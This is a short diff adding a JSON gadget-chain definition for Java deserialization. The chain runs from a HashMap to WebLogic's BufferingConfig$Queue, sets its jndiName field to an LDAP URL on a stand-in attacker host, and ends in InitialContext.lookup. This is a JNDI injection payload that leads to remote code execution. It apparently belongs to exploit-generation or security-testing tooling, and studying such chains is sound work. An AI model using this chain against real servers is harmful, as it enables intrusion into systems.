@@ -1,0 +1,16 @@
+{
+  "chain_type": "direct_chain",
+  "description": "WebLogic BufferingConfig$Queue: readObject with JNDI-related fields",
+  "root_class": "java.util.HashMap",
+  "root_trigger": "readObject\u2192hash\u2192hashCode",
+  "links": [
+    {
+      "class": "weblogic.wsee.jaxws.buffer.BufferingConfig$Queue",
+      "role": "sink",
+      "field_overrides": {
+        "jndiName": "ldap://attacker.example/evil"
+      }
+    }
+  ],
+  "sink_method": "InitialContext.lookup"
+}
